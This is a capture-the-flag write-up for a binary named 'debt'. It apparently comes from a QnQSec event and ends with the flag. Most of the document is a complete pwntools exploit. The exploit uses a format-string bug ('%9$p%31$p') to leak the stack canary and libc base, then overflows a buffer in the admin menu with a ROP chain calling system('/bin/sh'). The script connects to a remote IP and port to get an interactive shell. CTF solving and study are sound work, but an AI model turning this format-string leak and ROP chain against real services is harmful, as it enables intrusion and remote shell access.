# debt

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

There is a buffer overflow in the admin menu. We can leak the canary and the libc address through a formatted string vulnerability when our name is printed.

### Exploit
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./debt")
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-linux-x86-64.so.2",checksec=False)

context.binary = elf
#context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
'''

domain= "161.97.155.116"
port = 48760

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

r.sendlineafter(b"less)?",b"%9$p%31$p")

r.recvuntil(b"Hello, ")
leaks = r.recvline().strip()

canary = int(leaks[:18],16) 
libc.address = int(leaks[18:],16) -0x1e40 - 0x28000  

info("canary: " + hex(canary))
info("libc base address: " + hex(libc.address))
info("SYSTEM: " + hex(libc.symbols['system']))

bin_sh = next(libc.search(b"/bin/sh"))
pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x000000000002a3e6

payload = b"A"*56
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi) + p64(bin_sh) + p64(ret)
payload += p64(libc.symbols['system'])

r.sendline(b"\n4")
r.sendlineafter(b"access:", payload)
r.interactive()
```

`QnQSec{the_server_is_down:\}`

